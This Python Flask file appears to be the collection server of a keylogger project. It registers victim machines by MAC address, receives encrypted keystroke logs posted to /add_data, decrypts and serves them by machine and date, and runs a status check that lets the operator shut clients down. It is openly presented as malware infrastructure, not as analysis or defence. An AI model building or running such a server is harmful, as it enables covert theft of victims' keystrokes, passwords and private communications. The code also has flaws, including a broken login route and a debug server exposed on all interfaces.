import ast
import os

from flask import Flask, render_template, Blueprint, jsonify, request
import requests
import json
import time
from flask_cors import CORS
from getmac import get_mac_address

from KEYLOGGER_PROJECT.Encrypt_Decrypt.decrypt_file import Decrypt



# with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
#     json.dump({'flask':True}, f)


app = Flask(__name__)
CORS(app)


approved_login = {}


@app.route('/login', methods=['POST'])
def login():
    login_dic = dict(request.json)
    username = login_dic['user']
    password = login_dic['password']
    try:
        if approved_login[username] == password:
            return render_template()
    except:
        return jsonify({'status':'access denied'}), 400


@app.route('/get_macs', methods=['GET'])
def send_macs():
    macs = [ name.replace('-', ':').replace('_info','') for name in os.listdir(r'C:\Users\User\Desktop/keylogger_data') if os.path.isdir(os.path.join(r'C:\Users\User\Desktop/keylogger_data', name))]
    return jsonify(macs), 200


@app.route('/get_by_mac', methods=['GET'])
def get_by_mac():
    mac_address = request.args['mac']
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_mac = json.loads(f.read())
            for mac in dic_mac:
                if mac == mac_address:
                    files = os.listdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
                    return jsonify(files), 200
        return jsonify({'status':'mac not available'}), 400
    except:
        return jsonify({'status':'mac not available'}), 400


@app.route('/get_by_date', methods=['GET'])
def get_by_date():
    date = request.args.get('date')
    mac = request.args.get('mac')
    key = Decrypt.get_key(mac)
    path = fr'C:\Users\User\Desktop/keylogger_data/{mac.replace(':', '-')}_info/{date}'
    try:
        with open(path, 'r') as f:
            file_data = f.read()
            byte_value = ast.literal_eval(file_data)
            decrypted_data = Decrypt.decrypt_data(byte_value, key)
            return jsonify(decrypted_data), 200
    except Exception:
        return jsonify({'status':'date not available'}), 400


@app.route('/add_data', methods=['POST'])
def add_data():
    dict_data = dict(request.json)
    data = dict_data['data'].encode()
    mac = dict_data['mac']
    try:
        os.mkdir(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info')
    except FileExistsError:
        try:
            with open(fr'C:\Users\User\Desktop\keylogger_data\{mac.replace(':', '-')}_info\{time.strftime('%d-%m-%Y')}.json', 'ab') as f:
                f.write(data)
                return jsonify({'post':'successful'}), 200
        except Exception as e:
            print(e)
    return jsonify({'post':'not successful'}), 400


@app.route('/send_mac', methods=['POST'])
def send_mac():
    ''' get the mac '''
    mac = request.data
    dict_f= {}
    ''' add the mac to all addresses file '''
    with open(r'C:\Users\User\Desktop/keylogger_data/Mac_addresses.json', 'a') as f:
        f.write(mac.decode() + '\n')
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dict_f = json.loads(f.read())
    except:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'w') as f:
            dict_f[mac.decode()] = True
            json.dump(dict_f, f)

    return jsonify({'post':'successful'}), 200


@app.route('/check_status', methods=['GET'])
def check_status():
    mac = request.args.get('mac')
    try:
        with open(r'C:\Users\User\Desktop/keylogger_data/Mac_status.json', 'r') as f:
            dic_status = json.loads(f.read())
            if dic_status[mac] == False:
                return jsonify({'exit':True}), 400
        return jsonify({'exit':False}), 200
    except Exception as e:
        # print(e)
        pass
    return jsonify({'exit': False}), 200



app.run(debug=True, host='0.0.0.0')